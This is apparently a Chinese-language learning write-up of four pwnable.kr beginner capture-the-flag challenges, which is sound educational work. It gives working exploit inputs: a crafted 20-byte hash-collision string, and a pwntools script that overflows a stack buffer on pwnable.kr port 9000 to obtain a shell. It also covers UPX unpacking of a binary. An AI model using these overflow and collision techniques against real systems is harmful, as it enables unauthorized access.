## [pwnable.kr](http://pwnable.kr/play.php)

* [Toddler's Bottle](#)
    * [fd](#toddlers-bottle---fd)
    * [collision](#toddlers-bottle---collision)
    * [bof](#toddlers-bottle---bof)
    * [flag](#toddlers-bottle---flag)

#### Toddler's Bottle - fd

```sh
$ ssh fd@pwnable.kr -p2222 # guest
fd@ubuntu:~$ cat fd.c
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
    if(argc<2){
        printf("pass argv[1] a number\n");
        return 0;
    }
    int fd = atoi( argv[1] ) - 0x1234; // 文件描述符
    int len = 0;
    len = read(fd, buf, 32);           // 从fd中读取数据（这里理解为标准输入STDIN_FILENO即可）
    if(!strcmp("LETMEWIN\n", buf)){    // 从fd中读到内容为'LETMEWIN\n'
        printf("good job :)\n");
        system("/bin/cat flag");
        exit(0);
    }
    printf("learn about Linux file IO\n");
    return 0;
}
```

```sh
fd@ubuntu:~$ ./fd `python -c "print 0x1234"` # stdin
LETMEWIN
good job :)
mommy! I think I know what a file descriptor is!!
```

扩展学习：[Standard streams](https://en.wikipedia.org/wiki/Standard_streams), [File descriptor](https://en.wikipedia.org/wiki/File_descriptor)

#### Toddler's Bottle - collision

```sh
$ ssh col@pwnable.kr -p2222 # guest
col@ubuntu:~$ cat col.c
```

```c
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;            // 冲突md5
unsigned long check_password(const char* p){    // char 类型为1字节
    int* ip = (int*)p;                          // int 类型为4字节
    int i;
    int res=0;
    for(i=0; i<5; i++){
        res += ip[i];   // 可能溢出, int范围[-2^31, 2^31-1]
                        // 利用此处可能溢出漏洞，从0 --> 2^31-1 --[+1]--> -2^31 --> 0
    }
    return res;
}

int main(int argc, char* argv[]){
    if(argc<2){
        printf("usage : %s [passcode]\n", argv[0]);
        return 0;
    }
    if(strlen(argv[1]) != 20){                  // 输入20字节
        printf("passcode length should be 20 bytes\n");
        return 0;
    }

    if(hashcode == check_password( argv[1] )){
        system("/bin/cat flag");
        return 0;
    }
    else
        printf("wrong passcode.\n");
    return 0;
}
```

分析：

```c
#include <stdio.h>

unsigned long check_password(const char* p){
    int* ip = (int*)p;
    int i;
    int res=0;
    for(i=0; i<5; i++){
        printf("[%d]: %d\n", i, ip[i]);
        res += ip[i];
    }
    return res;
}

int main(int argc, char *argv[]) {
    char *a = "FFFFFFFFFFFFFFFF\0\0\0\0";               // #1
    // char *a = "FFFFFFFFFFFFFFFF\xd4\xf0\xc3\x08";    // #2
    printf("%ld\n", check_password(a));
    return 0;
}
```

抽取函数 `check_password` 并利用如上代码 **#1** 先计算出 `FFFF FFFF FFFF FFFF \0\0\0\0` 结果

```sh
$ gcc a.c; ./a.out
[0]: 1179010630
[1]: 1179010630
[2]: 1179010630
[3]: 1179010630
[4]: 0
421075224           # FFFFFFFFFFFFFFFF\0\0\0\0
$ python -c "print 0x21DD09EC - 421075224"  # 计算与期望 0x21DD09EC 差值
147058900
$ python -c "print hex(147058900)"          # 获取 \0\0\0\0 应对应的int值
0x8c3f0d4
```

目标机 `col@pwnable.kr` 为小端地址，因此 `0x8c3f0d4` => `\xd4\xf0\xc3\x08`，利用 **#2** 验证结果

```sh
col@ubuntu:~$ ./col `perl -e 'print "FFFFFFFFFFFFFFFF\xd4\xf0\xc3\x08"'`
daddy! I just managed to create a hash collision :)
```

扩展学习：[Integer (computer science)](https://en.wikipedia.org/wiki/Integer_(computer_science))

参考资料：[pwnable-collision](https://etenal.me/archives/972#C3)

#### Toddler's Bottle - bof

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
    char overflowme[32];
    printf("overflow me : ");
    gets(overflowme);       // smash me!
    if(key == 0xcafebabe){
        system("/bin/sh");
    }
    else{
        printf("Nah..\n");
    }
}
int main(int argc, char* argv[]){
    func(0xdeadbeef);
    return 0;
}
```

```asm
[0x00000530]> pdf @ sym.main
            ;-- main:
/ (fcn) sym.main 28
|   sym.main ();
|           0x0000068a      55             push ebp
|           0x0000068b      89e5           mov ebp, esp
|           0x0000068d      83e4f0         and esp, 0xfffffff0
|           0x00000690      83ec10         sub esp, 0x10
|           0x00000693      c70424efbead.  mov dword [esp], 0xdeadbeef ; [0xdeadbeef:4]=-1
|           0x0000069a      e88dffffff     call sym.func
|           0x0000069f      b800000000     mov eax, 0
|           0x000006a4      c9             leave
\           0x000006a5      c3             ret
[0x00000530]> pdf @ sym.func
/ (fcn) sym.func 94
|   sym.func (int arg_8h);
|           ; var int local_2ch @ ebp-0x2c
|           ; var int local_ch @ ebp-0xc
|           ; arg int arg_8h @ ebp+0x8
|              ; CALL XREF from 0x0000069a (sym.main)
|           0x0000062c      55             push ebp
|           0x0000062d      89e5           mov ebp, esp
|           0x0000062f      83ec48         sub esp, 0x48               ; 'H'
|           0x00000632      65a114000000   mov eax, dword gs:[0x14]    ; [0x14:4]=1
|           0x00000638      8945f4         mov dword [local_ch], eax
|           0x0000063b      31c0           xor eax, eax
|           0x0000063d      c704248c0700.  mov dword [esp], str.overflow_me_: ; [0x78c:4]=0x7265766f ; "overflow me : "  ; RELOC 32
(reloc.puts_69)
|           0x00000644      e8fcffffff     call reloc.puts_69            ; RELOC 32 puts
|           0x00000649      8d45d4         lea eax, dword [local_2ch]
|           0x0000064c      890424         mov dword [esp], eax
(reloc.gets_80)
|           0x0000064f      e8fcffffff     call reloc.gets_80            ; RELOC 32 gets
|           0x00000654      817d08bebafe.  cmp dword [arg_8h], 0xcafebabe ; [0xcafebabe:4]=-1
|       ,=< 0x0000065b      750e           jne 0x66b
|       |   0x0000065d      c704249b0700.  mov dword [esp], str._bin_sh ; [0x79b:4]=0x6e69622f ; "/bin/sh"  ; RELOC 32
(reloc.system_101)
|       |   0x00000664      e8fcffffff     call reloc.system_101         ; RELOC 32 system
|      ,==< 0x00000669      eb0c           jmp 0x677
|      ||      ; JMP XREF from 0x0000065b (sym.func)
|      |`-> 0x0000066b      c70424a30700.  mov dword [esp], str.Nah..  ; [0x7a3:4]=0x2e68614e ; "Nah.."  ; RELOC 32
(reloc.puts_115)
|      |    0x00000672      e8fcffffff     call reloc.puts_115           ; RELOC 32 puts
|      |       ; JMP XREF from 0x00000669 (sym.func)
|      `--> 0x00000677      8b45f4         mov eax, dword [local_ch]
|           0x0000067a      653305140000.  xor eax, dword gs:[0x14]
|       ,=< 0x00000681      7405           je 0x688
(reloc.__stack_chk_fail_132)
|       |   0x00000683      e8fcffffff     call reloc.__stack_chk_fail_132  ; RELOC 32 __stack_chk_fail
|       |      ; JMP XREF from 0x00000681 (sym.func)
|       `-> 0x00000688      c9             leave
\           0x0000
[0x00000530]>
```

栈空间分配及内存泄露问题，数组溢出即可篡改入参。

```asm
$ r2 bof
[0x00000530]> aaa
...
[0x00000530]> afl
...
[0x00000530]> pdf @ sym.func
/ (fcn) sym.func 94
|   sym.func (int arg_8h);
|           ; var int local_2ch @ ebp-0x2c
|           ; var int local_ch @ ebp-0xc
|           ; arg int arg_8h @ ebp+0x8
...
|           0x00000649      8d45d4         lea eax, dword [local_2ch]
...
|           0x00000654      817d08bebafe.  cmp dword [arg_8h], 0xcafebabe ; [0xcafebabe:4]=-1
...
[0x00000530]>
```

由上分析可知，`0x8 - (-0x2c) = 52` 即为 `key` 入参起始栈地址与 `overflowme` 数组起始栈地址之差，输入任意52个字节后，随后4个字节( `sizeof(int)` ) 对应的int值为 `0xcafebabe` 即可（注意大小端问题）

```py
#!/usr/bin/python2
# -*- coding: UTF-8 -*-
from pwn import *

pwn_socket = remote('pwnable.kr', 9000)
pwn_socket.sendline(' ' * 52 + '\xbe\xba\xfe\xca')
pwn_socket.interactive()
```

```sh
➜  pwn python a.py
[+] Opening connection to pwnable.kr on port 9000: Done
[*] Switching to interactive mode
$ cat flag
daddy, I just pwned a buFFer :)
$
[*] Closed connection to pwnable.kr port 9000
```

参考资料：[pwnable-bof](https://etenal.me/archives/972#C4)

#### Toddler's Bottle - flag

    Papa brought me a packed present! let's open it.

    Download : http://pwnable.kr/bin/flag

    This is reversing task. all you need is binary

题意让分析一个二进制文件，这个文件是加过壳的。对反汇编&加壳&去壳并不熟悉，直接找已有资料，学习如何处理此题。

参考 [\[Pwnable.kr\] flag](https://blog.yiz96.com/pwnable-flag/), [pwnable.kr flag - MtuucX](https://asciinema.org/a/111601)

学习资料 [什么是加壳和脱壳技术？加壳和脱壳技术是什么意思？](http://blog.csdn.net/zhu2695/article/details/12208221), [Radare2逆向的正确姿势](http://www.mottoin.com/86269.html)

分析：

1. 尝试运行

```sh
$ wget http://pwnable.kr/bin/flag
$ chmod +x flag
$ ./flag
I will malloc() and strcpy the flag there. take it.
$ radare2 flag      # 没有什么可直接关注到的信息
$ cgdb flag         # b main 并没有成功
```

2. 查看二进制文件 --> 找壳类型

```sh
$ strings flag | head -n 10     # 查看前10个可打印字符串
UPX!
@/x8
gX lw_
H/\_@
        Kl$
H9\$(t
[]]y
nIV,Uh
AWAVAUATS
uSL9
$ strings flag | tail -n 10     # 查看最后10个可打印字符串
;dl]tpR
c3Rh
2B)=
1\a}
_M]h
Upbrk
makBN
su`"]R
UPX!
UPX!
```

`UPX!` 这个是一个关键词，说明原elf文件被加壳保护([UPX](https://upx.github.io/))，直接去壳，再重头分析

3. 去壳 --> 还原为非壳二进制

```sh
$ upx -d flag -o unflag
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2017
UPX 3.94        Markus Oberhumer, Laszlo Molnar & John Reiser   May 12th 2017

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
    883745 <-    335288   37.94%   linux/amd64   unflag

Unpacked 1 file.
```

利用r2dare分析二进制，执行 `r2 -c=H unflag # 用浏览器查看反汇编内容`，找到 `main` 函数入口

```asm
...
0x00401168      sub rsp, 0x10
       ; 0x496658
       ; "I will malloc() and strcpy the flag there. take it."
0x0040116c      mov edi, str.I_will_malloc___and_strcpy_the_flag_there._take_it.
...
0x0040117b      call sym.malloc
0x00401180      mov qword [rbp - 8], rax
   ; [0x6c2070:8]=0x496628 str.UPX...__sounds_like_a_delivery_service_:_
   ; "(fI"
...
```

在 `main` 中我们可看到 `I will malloc() and strcpy the flag there. take it.` 我们在执行 `./flag` 时打印的内容，随后的 `call sym.malloc`, `mov qword [rbp -8], rax` 则调用库函数 `malloc` 动态分配内存空间，并将我们期望的 `flag` 拷贝过去。顺此思路我们找到地址 `0x496628`

```asm
...
0x00496628      .string "UPX...? sounds like a delivery service :)" ; len=42
...
```

DONE!

4. 提交flag，验证结果

**PS**: 看到一种取巧的查找方式，flag去壳后，直接 `$ strings unflag | grep ":)"` 就能找到（`:)` falg都会带的。。。。）
